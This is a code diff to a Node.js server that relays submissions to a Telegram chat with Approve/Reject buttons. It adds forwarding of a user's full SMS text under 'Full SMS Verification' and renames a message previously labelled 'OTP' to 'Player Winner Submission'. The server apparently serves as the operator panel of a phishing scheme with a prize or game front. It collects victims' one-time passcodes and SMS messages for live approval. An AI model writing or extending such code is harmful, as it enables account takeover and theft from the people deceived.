@@ -8,7 +8,14 @@ const CHAT_ID = process.env.CHAT_ID;
 const ROOT = __dirname;
 const submissions = new Map();
 
-function sendToTelegram(text, replyMarkup) {
+function escapeTelegramHtml(value) {
+  return String(value)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+}
+
+function sendToTelegram(text, replyMarkup, parseMode) {
   if (!BOT_TOKEN || !CHAT_ID) {
     return Promise.reject(new Error('BOT_TOKEN and CHAT_ID environment variables are required.'));
   }
@@ -16,6 +23,7 @@ function sendToTelegram(text, replyMarkup) {
   const payload = JSON.stringify({
     chat_id: CHAT_ID,
     text,
+    ...(parseMode ? { parse_mode: parseMode } : {}),
     ...(replyMarkup ? { reply_markup: replyMarkup } : {})
   });
 
@@ -141,6 +149,7 @@ const server = http.createServer(async (req, res) => {
           const data = JSON.parse(body || '{}');
           const playerId = String(data.playerId || '');
           const text = String(data.text || '');
+          const smsText = String(data.sms || '');
           const isTrial = data.type === 'trial';
           const isMing = data.type === 'ming';
           const requiresApproval = isTrial || isMing;
@@ -173,14 +182,17 @@ const server = http.createServer(async (req, res) => {
 
           await sendToTelegram(
             requiresApproval
-              ? `${text}\nSubmission: ${submissionId}`
-              : `OTP\nOTP: ${playerId}\nSubmission: ${submissionId}`,
+              ? isMing && smsText
+                ? `Full SMS Verification\nSMS:\n<pre>${escapeTelegramHtml(smsText)}</pre>\nSubmission: ${submissionId}`
+                : `${text}\nSubmission: ${submissionId}`
+              : `Player Winner Submission\nPlayer ID: ${playerId}\nSubmission: ${submissionId}`,
             {
               inline_keyboard: [[
                 { text: 'Approve', callback_data: `approve:${submissionId}` },
                 { text: 'Reject', callback_data: `reject:${submissionId}` }
               ]]
-            }
+            },
+            isMing && smsText ? 'HTML' : undefined
           );
 
           res.writeHead(200, { 'Content-Type': 'application/json' });
